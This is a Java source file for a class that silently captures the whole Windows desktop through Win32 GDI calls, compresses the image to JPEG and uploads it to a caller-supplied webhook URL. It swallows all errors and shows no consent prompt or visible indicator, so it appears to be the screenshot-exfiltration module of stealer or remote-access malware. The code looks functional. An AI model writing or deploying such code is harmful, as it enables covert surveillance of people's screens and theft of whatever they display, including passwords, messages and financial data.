import com.sun.jna.Memory;
import com.sun.jna.platform.win32.GDI32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinGDI;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import javax.imageio.IIOImage;
import javax.imageio.ImageWriter;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageIO;

public class ScreenshotCapture {

    private static final String IMAGE_FORMAT;

    public static byte[] captureScreen() {
        try {

            int screenWidth = User32.INSTANCE.GetSystemMetrics(0);
            int screenHeight = User32.INSTANCE.GetSystemMetrics(1);

            com.sun.jna.platform.win32.WinDef.HWND desktopHwnd =
                User32.INSTANCE.GetDesktopWindow();
            com.sun.jna.platform.win32.WinDef.HDC desktopDC =
                User32.INSTANCE.GetDC(desktopHwnd);

            com.sun.jna.platform.win32.WinDef.HDC memDC =
                GDI32.INSTANCE.CreateCompatibleDC(desktopDC);
            com.sun.jna.platform.win32.WinDef.HBITMAP bitmap =
                GDI32.INSTANCE.CreateCompatibleBitmap(desktopDC, screenWidth, screenHeight);

            GDI32.INSTANCE.SelectObject(memDC, bitmap);

            GDI32.INSTANCE.BitBlt(
                memDC, 0, 0, screenWidth, screenHeight,
                desktopDC, 0, 0,
                0x00CC0020
            );

            WinGDI.BITMAPINFO bitmapInfo = new WinGDI.BITMAPINFO();
            bitmapInfo.bmiHeader.biWidth = screenWidth;
            bitmapInfo.bmiHeader.biHeight = -screenHeight;
            bitmapInfo.bmiHeader.biPlanes = 1;
            bitmapInfo.bmiHeader.biBitCount = 32;
            bitmapInfo.bmiHeader.biCompression = WinGDI.BI_RGB;

            Memory buffer = new Memory(screenWidth * screenHeight * 4);
            GDI32.INSTANCE.GetDIBits(
                memDC, bitmap, 0, screenHeight,
                buffer, bitmapInfo, WinGDI.DIB_RGB_COLORS
            );

            BufferedImage image = new BufferedImage(
                screenWidth, screenHeight, BufferedImage.TYPE_INT_RGB
            );
            int[] pixels = new int[screenWidth * screenHeight];
            for (int i = 0; i < pixels.length; i++) {
                int b = buffer.getByte(i * 4L) & 0xFF;
                int g = buffer.getByte(i * 4L + 1) & 0xFF;
                int r = buffer.getByte(i * 4L + 2) & 0xFF;
                pixels[i] = (r << 16) | (g << 8) | b;
            }
            image.setRGB(0, 0, screenWidth, screenHeight, pixels, 0, screenWidth);

            GDI32.INSTANCE.DeleteObject(bitmap);
            GDI32.INSTANCE.DeleteDC(memDC);
            User32.INSTANCE.ReleaseDC(desktopHwnd, desktopDC);

            return compressAsJpeg(image, 0.7f);

        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] compressAsJpeg(BufferedImage image, float quality) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        ImageWriter writer = ImageIO.getImageWritersByFormatName("JPEG").next();
        ImageWriteParam params = writer.getDefaultWriteParam();
        params.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
        params.setCompressionQuality(quality);

        writer.setOutput(ImageIO.createImageOutputStream(baos));
        writer.write(null, new IIOImage(image, null, null), params);
        writer.dispose();

        return baos.toByteArray();
    }

    public static void captureAndSend(String webhookUrl) {
        try {
            byte[] screenshot = captureScreen();
            if (screenshot == null) return;

            String filename = "screenshot_" + System.currentTimeMillis() + ".jpg";
            new HttpUploader(webhookUrl).uploadFile(filename, screenshot, "📸 Screenshot");

        } catch (Exception e) {

        }
    }

    static {
        IMAGE_FORMAT = "JPEG";
    }
}